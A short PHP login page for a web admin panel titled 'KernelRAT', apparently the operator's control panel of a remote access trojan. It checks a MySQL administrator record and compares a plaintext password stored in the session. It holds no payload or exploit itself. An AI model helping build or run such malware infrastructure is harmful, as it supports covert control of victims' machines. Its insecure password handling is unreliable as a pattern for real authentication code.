<?php
 require_once('assets/config.php');
 $query = $mysqli->query("SELECT * FROM administrators WHERE id=1");
 $result = $query->fetch_assoc();
 session_start();
 ini_set('session.bug_compat_warn', 0);
 ini_set('session.bug_compat_42', 0);
 if( ($result['login'] == "") and ($result['pass'] == "") ) { header("Location: settings.php"); }
 if( ($_SESSION['login'] == $result['login']) and ($_SESSION['pass'] == $result['pass']) ) { header("Location: admin.php"); }
?>
<html>
 <head>
  <title>- KernelRAT -</title>
  <link rel="stylesheet" href="assets/css/style.css" media="screen" type="text/css" />
 </head>
 <body>
  <div class="login-block">
   <form method="post" action="admin.php">
    <input class="login-field"  type="text" name="login" autocomplete="off">
    <input class="login-field"  type="password" name="pass" autocomplete="off">
    <input class="login-button" type="submit" name="submit" value="Login">
    <?php 
     if($_GET['i'] == "edata") { echo "<p class=\"error-block\">Wrong authorization data!</p>"; } 
     if($_GET['i'] == "eauth") { echo "<p class=\"error-block\">You are not logged in!</p>"; } 
     if($_GET['i'] == "cauth") { echo "<p class=\"error-block\">Login again!</p>"; } 
    ?>
   </form>
  </div>
 </body>
</html>